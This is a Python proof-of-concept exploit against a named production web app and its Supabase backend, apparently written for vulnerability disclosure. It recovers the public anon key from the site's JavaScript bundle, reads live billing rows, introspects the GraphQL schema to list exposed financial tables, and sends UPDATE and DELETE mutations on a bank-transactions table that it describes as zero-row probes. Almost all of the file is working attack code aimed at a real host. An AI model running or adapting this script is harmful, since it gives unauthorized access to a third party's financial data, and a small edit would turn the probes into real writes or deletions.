#!/usr/bin/env python3
"""
PoC: CF Optimizer — unauthenticated Supabase access via public anon key
=======================================================================
Target : app.cfoptimizer.com -> hyrcvhzrnfbppyzuuosp.supabase.co
Date   : 2026-08-18
Impact : unauth READ of live billing config + UPDATE/DELETE permissions on
         financial tables (~300-table schema exposed via GraphQL)

SAFETY:
- READ-ONLY except two zero-row write probes (impossible UUID filter ->
  affectedCount: 0, no rows ever touched).
- No account creation, no data modification, no PII harvesting.
- Pure stdlib (urllib). Usage: python3 cfoptimizer_supabase_poc.py

Steps:
  1) recover anon key from the production JS bundle
  2) read live rows (subscription_plans, token_packages)
  3) enumerate schema via GraphQL introspection
  4) prove UPDATE/DELETE permission executes (zero-row)
"""

import json
import re
import sys
import urllib.request

BUNDLE_URL = "https://app.cfoptimizer.com/assets/index-DO8kisOM.js"
REST_URL = "https://hyrcvhzrnfbppyzuuosp.supabase.co/rest/v1/"
GRAPHQL_URL = "https://hyrcvhzrnfbppyzuuosp.supabase.co/graphql/v1"

# matches only rows whose id can never exist: guarantees 0 rows affected
ZERO_UUID = "00000000-0000-0000-0000-000000000000"


def fetch(url, method="GET", headers=None, body=None, timeout=20):
    req = urllib.request.Request(url, method=method, headers=headers or {})
    data = body if body is None else body.encode()
    with urllib.request.urlopen(req, data=data, timeout=timeout) as resp:
        return resp.status, dict(resp.headers), resp.read()


def anon_key():
    """Step 1: recover the anon key from the public bundle."""
    _, _, body = fetch(BUNDLE_URL)
    match = sorted(set(re.findall(rb"eyJ[A-Za-z0-9_.\-]{80,}", body)))[0]
    key = match.decode()
    payload = key.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    import base64
    claims = json.loads(base64.urlsafe_b64decode(payload))
    assert claims["role"] == "anon", "key is not an anon key?"
    print(f"[1] anon key recovered from {BUNDLE_URL}")
    print(f"    role={claims['role']} ref={claims['ref']} exp={claims['exp']}")
    return key


def rest_read(key, table, limit=3):
    """Step 2a: read live rows via PostgREST with ONLY the anon key."""
    url = f"{REST_URL}{table}?select=*&limit={limit}"
    h = {"apikey": key, "Authorization": f"Bearer {key}", "Prefer": "count=exact"}
    status, headers, body = fetch(url, headers=h)
    rows = json.loads(body)
    print(f"[2] REST GET /rest/v1/{table}?select=*&limit={limit} -> {status}"
          f" ({len(rows)} rows, Content-Range: {headers.get('Content-Range')})")
    for row in rows:
        print("    ", {k: row[k] for k in list(row)[:6]})
    return rows


def graphql(key, query, timeout=25):
    h = {"apikey": key, "Authorization": f"Bearer {key}",
         "Content-Type": "application/json"}
    status, _, body = fetch(GRAPHQL_URL, method="POST", headers=h,
                            body=json.dumps({"query": query}), timeout=timeout)
    return status, json.loads(body)


def graphql_introspect(key):
    """Step 3: prove full schema + mutation exposure to the anon role."""
    status, d = graphql(
        key,
        "{__schema{queryType{fields{name}} mutationType{fields{name}}}}",
    )
    q = d.get("data", {}).get("__schema", {}).get("queryType", {}).get("fields", [])
    m = d.get("data", {}).get("__schema", {}).get("mutationType", {}).get("fields", [])
    tables = sorted({f["name"].removesuffix("Collection") for f in q
                     if f["name"].endswith("Collection")})
    writes = [f["name"] for f in m
              if f["name"].startswith(("insertInto", "update", "deleteFrom"))]
    print(f"[3] GraphQL introspection (anon role) -> {status}")
    print(f"    collections exposed: {len(tables)}")
    print(f"    write mutations exposed: {len(writes)} (insert/update/delete)")
    sensitive = [t for t in tables if any(k in t for k in
                 ("bank_transaction", "ar_invoice", "security_audit",
                  "token_transaction", "unipile_email", "user_role",
                  "connected_bank", "qbo", "plaid_item"))]
    print(f"    sensitive collections of note: {', '.join(sensitive[:10])}")
    return tables


def zero_row_write_probe(key, op):
    """Step 4: prove write permission WITHOUT touching data.

    Impossible-id filter -> any response other than 42501 'permission denied'
    proves the anon role holds UPDATE/DELETE. affectedCount 0 = ran clean.
    """
    if op == "update":
        q = ("mutation{updatebank_transactionsCollection("
             'set:{name:"__opencode_probe"},'
             'filter:{id:{eq:"' + ZERO_UUID + '"}}){affectedCount}}')
    else:
        q = ("mutation{deleteFrombank_transactionsCollection("
             'filter:{id:{eq:"' + ZERO_UUID + '"}}){affectedCount}}')
    status, d = graphql(key, q)
    err = d.get("errors") or []
    denied = any("permission denied" in (e.get("message") or "") for e in err)
    print(f"[4] {op.upper()} probe (zero-row, no data touched) -> {status}")
    print(f"    result: {json.dumps(d.get('data'))} errors: {json.dumps(err)}")
    if denied:
        print("    -> RLS denies anon writes (expected state: NOT vulnerable)")
    else:
        print("    -> anon role HOLDS write permission (0 rows matched; nothing changed)")


def main():
    print("=== CF Optimizer Supabase PoC (read-only + zero-row write proof) ===\n")
    key = anon_key()
    print()
    rest_read(key, "subscription_plans")
    rest_read(key, "token_packages")
    print()
    graphql_introspect(key)
    print()
    zero_row_write_probe(key, "update")
    zero_row_write_probe(key, "delete")
    print("\nDone. No data was modified; zero-row probes only.")


if __name__ == "__main__":
    sys.exit(main())
